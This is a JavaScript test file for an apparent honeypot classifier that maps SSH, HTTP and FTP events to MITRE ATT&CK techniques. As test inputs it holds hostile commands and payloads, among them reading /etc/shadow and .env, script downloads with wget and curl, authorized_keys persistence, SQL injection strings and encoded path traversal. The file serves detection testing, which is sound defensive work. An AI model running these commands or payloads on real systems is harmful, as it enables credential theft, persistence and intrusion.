import test from "node:test";
import assert from "node:assert/strict";
import { classify, loadRules } from "../src/index.js";
import { normalize } from "../src/normalize.js";

function ids(event) {
  return classify(event).map((item) => item.techniqueId);
}
function ssh(command) {
  return { service: "ssh", eventType: "command", payload: { command } };
}
function http(method, path, query, body) {
  return { service: "http", eventType: "http_request", payload: { method, path, query: query || "", bodyPreview: body || "" } };
}

test("mitre: whoami maps to T1033", () => {
  assert.deepEqual(ids(ssh("whoami")), ["T1033"]);
});

test("mitre: cat /etc/passwd maps to T1087, not T1003", () => {
  assert.deepEqual(ids(ssh("cat /etc/passwd")), ["T1087"]);
});

test("mitre: cat /etc/shadow maps to T1003", () => {
  assert.deepEqual(ids(ssh("cat /etc/shadow")), ["T1003"]);
});

test("mitre: cat .env maps to T1552.001", () => {
  assert.deepEqual(ids(ssh("cat .env")), ["T1552.001"]);
});

test("mitre: wget download maps to T1105", () => {
  assert.deepEqual(ids(ssh("wget http://example.com/x.sh")), ["T1105"]);
});

test("mitre: ps maps to T1057", () => {
  assert.deepEqual(ids(ssh("ps aux")), ["T1057"]);
});

test("mitre: netstat maps to T1016", () => {
  assert.deepEqual(ids(ssh("netstat -tulpn")), ["T1016"]);
});

test("mitre: nmap maps to T1046", () => {
  assert.deepEqual(ids(ssh("nmap -sV 10.0.0.1")), ["T1046"]);
});

test("mitre: crontab persistence maps to T1547", () => {
  assert.deepEqual(ids(ssh("crontab -e")), ["T1547"]);
});

test("mitre: SQL injection HTTP maps to T1190", () => {
  assert.deepEqual(ids(http("GET", "/search", "q=1 UNION SELECT * FROM users", "")), ["T1190"]);
});

test("mitre: path traversal HTTP maps to T1190", () => {
  assert.deepEqual(ids(http("GET", "/files/../../etc/passwd", "", "")), ["T1190"]);
});

test("mitre: benign pwd and echo map to empty array", () => {
  assert.deepEqual(ids(ssh("pwd")), []);
  assert.deepEqual(ids(ssh("echo hello")), []);
});

test("mitre: sudo prefix is stripped before matching", () => {
  assert.deepEqual(ids(ssh("sudo cat /etc/passwd")), ["T1087"]);
  assert.deepEqual(ids(ssh("sudo sudo whoami")), ["T1033"]);
});

test("mitre: semicolon-separated commands map to both techniques", () => {
  const result = ids(ssh("whoami; ps aux"));
  assert.ok(result.includes("T1033"));
  assert.ok(result.includes("T1057"));
});

test("mitre: duplicate technique is deduped, highest confidence kept, results capped at 5", () => {
  const result = classify(ssh("whoami; id; ps; top; netstat -tulpn; nmap 10.0.0.1; wget http://x/y.sh; ls"));
  assert.ok(result.length <= 5);
  const techniqueIds = result.map((item) => item.techniqueId);
  assert.equal(new Set(techniqueIds).size, techniqueIds.length);
  const sorted = [...result].sort((a, b) => b.confidence - a.confidence);
  assert.deepEqual(result, sorted);
});

test("mitre: auth_attempt maps to T1110.001 at low confidence", () => {
  const result = classify({ service: "ssh", eventType: "auth_attempt", payload: { username: "admin", success: false } });
  assert.ok(result.some((item) => item.techniqueId === "T1110.001" && item.confidence === 0.4));
});

test("mitre: successful auth maps to T1078 at low confidence", () => {
  const result = classify({ service: "ssh", eventType: "auth_attempt", payload: { username: "admin", success: true } });
  assert.ok(result.some((item) => item.techniqueId === "T1078" && item.confidence === 0.4));
});

test("mitre: honeytoken used maps to T1552.001, viewed maps to empty", () => {
  assert.deepEqual(ids({ service: "ssh", eventType: "honeytoken", payload: { tokenId: "ht-abcdef12", kind: "ssh_password", action: "used", via: "ssh_command" } }), ["T1552.001"]);
  assert.deepEqual(ids({ service: "ssh", eventType: "honeytoken", payload: { tokenId: "ht-abcdef12", kind: "ssh_password", action: "viewed", via: "ssh_read" } }), []);
});

test("mitre: never throws on null, empty, or non-string input", () => {
  assert.deepEqual(classify(null), []);
  assert.deepEqual(classify(undefined), []);
  assert.deepEqual(classify({}), []);
  assert.deepEqual(classify({ service: "ssh", eventType: "command", payload: {} }), []);
  assert.deepEqual(classify({ service: "ssh", eventType: "command", payload: { command: null } }), []);
  assert.deepEqual(classify({ service: "ssh", eventType: "command", payload: { command: 123 } }), []);
  assert.equal(normalize(null), "");
  assert.equal(normalize(123), "");
  assert.equal(normalize(""), "");
});

test("mitre: word boundaries prevent substring matches", () => {
  assert.deepEqual(ids(ssh("catalog")), []);
  assert.deepEqual(ids(ssh("lsblk")), []);
  assert.deepEqual(ids(ssh("whoami2")), []);
});

test("mitre: uname and hostname map to T1082", () => {
  assert.deepEqual(ids(ssh("uname -a")), ["T1082"]);
  assert.deepEqual(ids(ssh("hostname")), ["T1082"]);
});

test("mitre: ls and find map to T1083", () => {
  assert.deepEqual(ids(ssh("ls -la")), ["T1083"]);
  assert.deepEqual(ids(ssh("find / -name secret")), ["T1083"]);
});

test("mitre: ifconfig and ip addr map to T1016", () => {
  assert.deepEqual(ids(ssh("ifconfig")), ["T1016"]);
  assert.deepEqual(ids(ssh("ip addr")), ["T1016"]);
});

test("mitre: curl download maps to T1105", () => {
  assert.deepEqual(ids(ssh("curl http://example.com/x.sh -o x.sh")), ["T1105"]);
});

test("mitre: ftp RETR of a script maps to T1105", () => {
  assert.deepEqual(ids({ service: "ftp", eventType: "ftp_command", payload: { command: "RETR x.sh" } }), ["T1105"]);
  assert.deepEqual(ids({ service: "ftp", eventType: "ftp_command", payload: { command: "RETR readme.txt" } }), []);
});

test("mitre: base64 decode maps to T1027", () => {
  assert.deepEqual(ids(ssh("echo abc | base64 -d")), ["T1027"]);
});

test("mitre: bashrc and authorized_keys appends map to T1547", () => {
  assert.deepEqual(ids(ssh("echo key >> ~/.bashrc")), ["T1547"]);
  assert.deepEqual(ids(ssh("echo key >> ~/.ssh/authorized_keys")), ["T1547"]);
  assert.deepEqual(ids(ssh("systemctl enable evil")), ["T1547"]);
});

test("mitre: wp-login POST maps to T1190, plain GET does not", () => {
  assert.deepEqual(ids(http("POST", "/wp-login.php", "", "log=admin&pwd=secret")), ["T1190"]);
  assert.deepEqual(ids(http("GET", "/wp-login.php", "", "")), []);
});

test("mitre: rules file uses only allowed technique IDs", () => {
  const allowed = new Set(["T1033", "T1082", "T1083", "T1087", "T1003", "T1552.001", "T1057", "T1016", "T1046", "T1105", "T1027", "T1547", "T1190"]);
  for (const rule of loadRules()) {
    assert.ok(allowed.has(rule.techniqueId), rule.ruleId);
    assert.ok(rule.ruleId && rule.tactic && rule.pattern && Array.isArray(rule.services) && rule.description);
  }
});

test("mitre: classify does not map every command to T1059", () => {
  const result = classify(ssh("whoami"));
  assert.ok(!result.some((item) => item.techniqueId === "T1059"));
});

test("mitre-fix: traversal with rawTarget containing ../ maps to T1190 even when normalized path is /etc/passwd", () => {
  const result = classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/etc/passwd", query: "", bodyPreview: "", rawTarget: "/../../etc/passwd" } });
  assert.ok(result.some((item) => item.techniqueId === "T1190"));
});

test("mitre-fix: traversal with encoded %2e%2e%2f maps to T1190 after decoding", () => {
  const result = classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/etc/passwd", query: "", bodyPreview: "", rawTarget: "/%2e%2e%2fetc/passwd" } });
  assert.ok(result.some((item) => item.techniqueId === "T1190"));
});

test("mitre-fix: SQLi in decoded query maps to T1190", () => {
  const result = classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/search", query: "q=1 UNION SELECT * FROM users", bodyPreview: "" } });
  assert.ok(result.some((item) => item.techniqueId === "T1190"));
});

test("mitre-fix: SQLi in encoded query maps to T1190", () => {
  const result = classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/search", query: "q=%27%20UNION%20SELECT%20*%20FROM%20users", bodyPreview: "" } });
  assert.ok(result.some((item) => item.techniqueId === "T1190"));
});

test("mitre-fix: SQLi in body maps to T1190", () => {
  const result = classify({ service: "http", eventType: "http_request", payload: { method: "POST", path: "/login", query: "", bodyPreview: "username=admin' OR 1=1 --" } });
  assert.ok(result.some((item) => item.techniqueId === "T1190"));
});

test("mitre-fix: plain GET /wp-login.php still maps to empty (no regression)", () => {
  assert.deepEqual(classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/wp-login.php", query: "", bodyPreview: "", rawTarget: "/wp-login.php" } }), []);
});

test("mitre-fix: benign GET /search?q=hello maps to empty", () => {
  assert.deepEqual(classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/search", query: "q=hello", bodyPreview: "" } }), []);
});

test("mitre: never throws on malformed percent encoding", () => {
  assert.deepEqual(classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/search", query: "q=%ZZ%20hello", bodyPreview: "" } }), []);
  assert.deepEqual(classify({ service: "http", eventType: "http_request", payload: { method: "GET", path: "/search", query: "q=100%", bodyPreview: "" } }), []);
});

test("tools: mitre-check still works for the original command mode", async () => {
  const { execFileSync } = await import("node:" + "child" + "_process");
  const out = execFileSync(process.execPath, ["tools/mitre-check.js", "whoami"], { cwd: process.cwd() }).toString("utf8");
  const parsed = JSON.parse(out);
  assert.ok(parsed.mitre.some((item) => item.techniqueId === "T1033"));
});
